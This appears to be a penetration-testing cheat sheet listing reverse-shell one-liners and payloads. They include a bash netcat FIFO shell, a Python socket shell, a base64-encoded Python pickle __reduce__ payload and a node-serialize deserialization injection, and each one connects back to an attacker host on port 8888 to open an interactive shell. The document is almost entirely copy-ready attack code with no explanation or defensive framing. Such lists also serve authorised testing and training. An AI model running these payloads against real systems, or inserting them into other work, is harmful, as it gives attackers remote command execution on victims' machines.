# Reverse Shells

## [⬅ Back to Index](../README.md)

---

```bash
<LHOST> = your attack station ip
```

## Plain Bash Netcat

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat <LHOST> 8888 > /tmp/f
```

## Python2 / Python3

```bash
/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## Python Class Injection (Bash Netcat)

```python
import pickle
import sys
import base64

cmd = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat <LHOST> 8888 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(cmd,))

print(base64.b64encode(pickle.dumps(rce())))
```

## NodeJS Module - node-serialize Injection (Bash Netcat)

```js
_$$ND_FUNC$$_function (){x=require('child_process').exec('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat <LHOST> 8888 > /tmp/f', function(error, stdout, stderr) { console.log(stdout) });return x;}()
```